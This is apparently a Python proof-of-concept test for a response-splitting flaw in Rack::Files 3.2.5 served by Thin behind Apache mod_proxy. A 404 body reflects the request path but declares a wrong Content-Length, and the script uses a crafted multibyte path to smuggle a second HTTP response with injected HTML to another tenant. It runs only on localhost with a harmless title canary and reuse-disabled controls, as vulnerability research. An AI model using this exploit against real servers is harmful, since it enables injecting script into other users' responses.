#!/usr/bin/env python3
"""Test a real Rack::Files length mismatch with an HTTP-response tail.

Rack 3.2.5 reflects the attacker-controlled missing path in a 404 body but
declares String#size instead of the wire byte length.  This test aligns a
second HTTP response at the first delayed byte, then checks whether Apache's
pooled backend connection turns it into tenant B's response.  The HTML body
only changes document.title; it does not read or send any user data.
"""

from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from urllib.parse import quote_from_bytes


def read_response(sock: socket.socket) -> bytes:
    sock.settimeout(8)
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(8192)
        if not chunk:
            raise RuntimeError(f"incomplete response headers: {data!r}")
        data += chunk
    head, body = data.split(b"\r\n\r\n", 1)
    length = next(
        int(line.split(b":", 1)[1].strip())
        for line in head.split(b"\r\n")
        if line.lower().startswith(b"content-length:")
    )
    while len(body) < length:
        body += sock.recv(8192)
    return head + b"\r\n\r\n" + body[:length]


def read_response_with_extra(sock: socket.socket) -> bytes:
    response = read_response(sock)
    extra = b""
    sock.settimeout(3)
    try:
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            extra += chunk
    except socket.timeout:
        pass
    return response + extra


def wait_for_port(port: int, process: subprocess.Popen[str], label: str) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if process.poll() is not None:
            raise RuntimeError(f"{label} exited: {process.stderr.read()}")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"{label} did not listen")


def make_attack_path() -> tuple[str, bytes]:
    html = (
        b"<html><script>document.title='A_CONTROLLED_CANARY'</script></html>"
    )
    # Pick a value whose integer-length boundary admits an exact solution for
    # the self-referential Content-Length/padding equation below while keeping
    # the ordinary request target well below common URI limits.
    before = 87
    for after in range(before * 2):
        padded_body = html + ("☃" * after).encode()
        marker = (
            b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
            b"X-A-Controlled: A_ONLY\r\nContent-Length: "
            + str(len(padded_body)).encode()
            + b"\r\nConnection: close\r\n\r\n"
            + padded_body
        )
        # Rack's wrong character count makes the delayed tail begin at this
        # byte offset: 2 * before == marker chars + after + final newline.
        if after == 2 * before - len(marker) - 1:
            encoded_marker = quote_from_bytes(marker, safe=b"")
            path = "/missing/" + "%E2%98%83" * before + encoded_marker + "%E2%98%83" * after
            return path, marker
    raise AssertionError("could not align the Rack response tail")


def start_apache(httpd: Path, server_root: Path, backend_port: int,
                 port: int, root: Path, disablereuse: bool) -> subprocess.Popen[str]:
    reuse = " disablereuse=On" if disablereuse else ""
    config = root / "httpd.conf"
    config.write_text(f"""\
ServerRoot "{server_root}"
Listen 127.0.0.1:{port}
PidFile "{root / 'httpd.pid'}"
ErrorLog "{root / 'error.log'}"
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
ProxyPass / http://127.0.0.1:{backend_port}/ retry=0{reuse}
ProxyPassReverse / http://127.0.0.1:{backend_port}/
""")
    apache = subprocess.Popen(
        [str(httpd), "-f", str(config), "-DFOREGROUND", "-X"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        env={**os.environ, "APACHE_RUN_DIR": str(root)},
    )
    wait_for_port(port, apache, "Apache")
    return apache


def trigger_attack(port: int, path: str, collect_extra: bool = False) -> bytes:
    with socket.create_connection(("127.0.0.1", port), timeout=8) as attacker:
        attacker.sendall(
            f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
            "Connection: keep-alive\r\n\r\n".encode()
        )
        if collect_extra:
            return read_response_with_extra(attacker)
        return read_response(attacker)


def fetch_victim(port: int) -> bytes:
    with socket.create_connection(("127.0.0.1", port), timeout=8) as victim:
        victim.sendall(
            b"GET /victim HTTP/1.1\r\nHost: tenant-b.example\r\n"
            b"Connection: close\r\n\r\n"
        )
        return read_response(victim)


def browser_victim(browser: str, port: int) -> bytes:
    result = subprocess.run(
        [browser, "--headless", "--no-sandbox", "--disable-gpu",
         "--no-proxy-server", "--dump-dom", "--virtual-time-budget=1000",
         "--host-resolver-rules=MAP tenant-b.example 127.0.0.1",
         f"http://tenant-b.example:{port}/victim"],
        capture_output=True, text=True, timeout=15,
        env={**os.environ, "NO_PROXY": "*", "no_proxy": "*"},
    )
    print(f"browser_exit={result.returncode}")
    print(f"browser_dom={result.stdout[:2000]!r}")
    return result.stdout.encode()


def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
            disablereuse: bool, browser: bool) -> bool:
    with tempfile.TemporaryDirectory(prefix="rack-thin-split-") as tmp:
        root = Path(tmp)
        thin_log = root / "thin.log"
        thin = subprocess.Popen(
            [str(args.thin), "start", "-R", str(args.fixture / "config.ru"),
             "-a", "127.0.0.1", "-p", "18181"],
            cwd=args.fixture, stdout=thin_log.open("w"), stderr=subprocess.STDOUT,
            text=True, env={**os.environ, "RACK_FILES_ROOT": str(root / "files")},
        )
        (root / "files").mkdir()
        apache = None
        try:
            wait_for_port(18181, thin, "Thin")
            direct = trigger_attack(18181, path, collect_extra=True)
            print(f"direct_tail_marker={expected_marker in direct}")
            print(f"direct_response_tail={direct[-1200:]!r}")
            if expected_marker not in direct:
                print("rack_thin_split_input_reached_app=False")
                return False
            apache = start_apache(args.httpd, args.server_root, 18181, 18080, root, disablereuse)
            response_a = trigger_attack(18080, path)
            print(f"response_a_suffix={response_a[-80:]!r}")
            if browser:
                body_b = browser_victim(args.browser, 18080)
                observed = b"A_CONTROLLED_CANARY" in body_b
            else:
                response_b = fetch_victim(18080)
                print(f"response_b={response_b!r}")
                observed = expected_marker in response_b
            mode = "disabled" if disablereuse else "enabled"
            kind = "browser" if browser else "raw"
            print(f"rack_thin_split_mode={mode} kind={kind} observed={observed}")
            if disablereuse and observed:
                raise AssertionError("reuse-disabled control still carried A marker")
            return observed
        finally:
            if apache is not None:
                apache.terminate()
                try:
                    apache.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    apache.kill()
            thin.terminate()
            try:
                thin.wait(timeout=3)
            except subprocess.TimeoutExpired:
                thin.kill()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--thin", required=True, type=Path)
    parser.add_argument("--fixture", required=True, type=Path)
    parser.add_argument("--browser", type=str)
    args = parser.parse_args()
    args.browser = args.browser or shutil.which("chromium") or shutil.which("chromium-browser")
    if not args.browser:
        raise SystemExit("chromium is required for browser validation")
    path, marker = make_attack_path()
    raw_positive = one_run(args, path, marker, False, False)
    if not raw_positive:
        print("rack_thin_split_real_trigger=not_observed")
        return 0
    browser_positive = one_run(args, path, marker, False, True)
    one_run(args, path, marker, True, False)
    one_run(args, path, marker, True, True)
    print(f"rack_thin_split_raw_positive={raw_positive}")
    print(f"rack_thin_split_browser_positive={browser_positive}")
    if not raw_positive or not browser_positive:
        print("rack_thin_split_real_trigger=not_observed")
    else:
        print("rack_thin_split_real_trigger=observed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
